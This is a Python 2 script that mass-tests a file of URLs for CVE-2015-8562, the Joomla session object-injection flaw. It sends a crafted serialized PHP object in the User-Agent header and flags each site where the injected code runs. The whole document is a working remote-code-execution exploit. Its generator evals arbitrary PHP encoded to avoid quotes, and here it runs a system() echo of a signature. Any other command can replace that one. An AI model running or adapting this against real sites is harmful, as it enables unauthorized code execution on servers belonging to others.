import requests
import sys

def print_banner( ):
    print "*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*"
    print "* Massrce.py - a simple massive tester for CVE-2015-8562.             *"
    print "* Usage: python massrce.py urls_to_test.txt                           *"
    print "*                                                                     *"    
    print "* Original exploit code: https://www.exploit-db.com/exploits/38977/   *"
    print "*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*"
    print ""
    
def get_url( url, user_agent ):
    headers = { 'User-Agent' : user_agent }
    cookies = requests.get( url, headers = headers ).cookies
    for _ in range( 3 ):
        response = requests.get( url, headers = headers, cookies = cookies )  
        
    return response
     
def php_str_noquotes( data ):
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format( ord( char ) )
   
    return encoded[ :-1 ]
   
   
def generate_payload( php_payload ):
    php_payload = "eval({0})".format( php_str_noquotes( php_payload ) )
   
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format( php_payload )    
    exploit_template += r'''s:{0}:"{1}"'''.format( str( len( injected_payload ) ), injected_payload )
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
   
    return exploit_template
   
if len( sys.argv ) != 2: 
    print_banner( )
    sys.exit( 0 )

urls_filename = sys.argv[ 1 ]
with open ( urls_filename, "r" ) as f:
    urls_list = f.readlines( )
    
print "[ INFO ] Loaded " + str( len( urls_list ) ) + " URLs from " + urls_filename

# Use md5('test') as a signature of successful exploitation
signature = "d8e8fca2dc0f896fd7cb4cb0031ba249"
payload = generate_payload( "system('echo " + signature + "');" )

print "[ INFO ] Payload successfuly generated"   
print "[ INFO ] Let's rock!"
print ""

for url in urls_list:
    url = url.rstrip( )

    content = get_url( url, payload ).text
    
    if signature in content:
        print "[ VULNERABLE ] " + url
    else:
        print "[ SAFE ] " + url
